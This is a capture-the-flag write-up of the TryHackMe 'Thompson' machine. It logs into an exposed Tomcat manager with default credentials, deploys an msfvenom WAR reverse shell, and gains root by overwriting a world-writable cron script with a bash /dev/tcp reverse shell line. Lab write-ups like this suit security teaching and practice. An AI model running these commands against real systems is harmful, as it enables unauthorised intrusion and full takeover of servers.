---
title: "Thompson - THM"
date: 2026-02-20
draft: false
description: "Gaining access to a Tomcat server"
tags: ["hacking", "tryhackme"]
categories: ["thm", "ctf"]
toc: false
---

| | |
|---|---|
| **Difficulty** | Easy |
| **OS** | Linux |
| **Tools Used** | nmap, msfvenom, netcat |
| **Platform** | TryHackMe |

## Recon

Starting with an nmap scan:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 8.5.5
```

Three ports exposed. SSH on 22, and more interestingly, Apache Tomcat 8.5.5 on 8080 with the AJP connector exposed on 8009. AJP was new to me, so I looked into it.

AJP is a binary protocol designed to sit inside a network, brokering requests between a front-end web server and Tomcat. Because it assumes it's talking to a trusted internal proxy, it has no authentication. That's the root of **Ghostcat (CVE-2020-1938)**.

The vulnerability has two components. First, AJP grants access to `WEB-INF/`, which is explicitly blocked to HTTP clients by the servlet specification. This directory contains `web.xml` (URL-to-servlet mappings, credentials, app config) and other files never meant to be externally readable. Second, AJP allows setting arbitrary request attributes that HTTP clients can't touch, including instructing Tomcat to include and execute a file as JSP (Java's equivalent of PHP). 

Combining read access with file inclusion means an attacker who can write a file anywhere on the server (an upload endpoint, for example) can chain it into remote code execution.

So basically, an exposed port 8009 gives any unauthenticated attacker the same trust level as an internal web server.

I ran the exploit, but got nothing useful. So time to enumerate manually.

## Enumeration

Tomcat 8.5.5 on port 8080. The default manager credentials `tomcat:s3cret` are worth trying immediately against `/manager/html`, which is Tomcat's built-in management interface. The path is fixed and well-documented, so it's one of the first things worth checking on any exposed Tomcat instance:

```bash
curl http://10.82.152.247:8080/manager/html -u tomcat:s3cret >> manager.txt
```

That worked - full access to the Tomcat Web Application Manager. Browsing through the application list, one path stood out immediately:

```bash
/hgkFDt6wiHIUB29WWEON5PA
```

Not a default Tomcat application. Worth keeping in mind.

More importantly, the manager is accessible and the `tomcat` user is authenticated. The server info confirms we're dealing with Tomcat 8.5.5 on Linux (amd64), JVM 1.8.0_222.

## Foothold: WAR

The next step is to deploy a malicious WAR file, or Web Application Archive which is essentially a JAR (Java ARchive, which is just a ZIP) through the manager. Since Tomcat will unpack and execute whatever we give it, we can package a JSP reverse shell into a WAR and have the server run it for us. `msfvenom` can generate this directly:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<tun0-ip> LPORT=4444 -f war -o shell.war
```

This produces a WAR file containing a JSP payload that, when Tomcat serves it, opens a reverse TCP connection back to our machine.

However, there's a catch worth noting: the `tomcat` user has the `manager-gui` role but **not** `manager-script`. This means the text API at `/manager/text/deploy` returns a 403 - you can't deploy via curl or API calls. You have to go through the HTML interface.

Sp I uploaded it through the manager GUI at `/manager/html`, set up a listener on Kali:

```bash
nc -lvnp 4444
```

Navigated to the deployed webapp path, and caught a shell back as the `tomcat` service account:

```bash
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

The `user.txt` flag was then easily found in the user jack's home directory.

**IMPORTANT:** `manager-gui` and `manager-script` are separate roles in Tomcat 8.5+. Having GUI access doesn't grant script/API access - they need to be assigned explicitly in `tomcat-users.xml`.

## Privilege Escalation

From the tomcat shell, I ran basic privesc enumeration:

```bash
find / -perm -4000 -type f 2>/dev/null  # SUID binaries
cat /etc/crontab
id
```

This searches the entire filesystem for SUID binaries. SUID means the file executes with the permissions of its owner rather than the user running it.

Most SUID binaries are owned by root, so if any of them are exploitable (known vulnerable versions, unusual binaries that shouldn't have SUID, or anything that spawns a shell) you can leverage them to execute code as root regardless of your current privileges!

But nothing interesting in SUID binaries. However, `/etc/crontab` had something immediately useful:

```bash
*  *  *  *  *   root    cd /home/jack && bash id.sh
```

A cron job running every minute as root, executing `id.sh` from the user jack's home directory...

Checked the permissions:

```bash
ls -la /home/jack/id.sh
# -rwxrwxrwx 1 jack jack 26 Aug 14  2019 /home/jack/id.sh
```

It is world-writable. Next I overwrote it with a reverse shell:

```bash
echo 'bash -i >& /dev/tcp/<ip>/5555 0>&1' > /home/jack/id.sh
```

Then I set up a listener on port 5555 and waited less than a minute for cron to fire. Root shell was promptly received, and the flag retrieved from `/root/root.txt`.

From this I took away that cron jobs executing as root are high-value targets during privesc. If the script being called is world-writable, it's trivially exploitable. You should always check `/etc/crontab` and verify permissions on every file it references.

---

## Summary

| Step | Vector |
|------|--------|
| Initial access | Tomcat manager GUI with default credentials |
| Foothold | Malicious WAR file deployment |
| Privesc | World-writable cron script running as root |

*Thompson* is a clean example of how default credentials combined with a privileged service account can lead directly to a compromised box, and how a misconfigured cron job can easily unravel any privilege boundary that might otherwise exist. Both are apparently extremely common findings in real environments... Make do with that what you will.
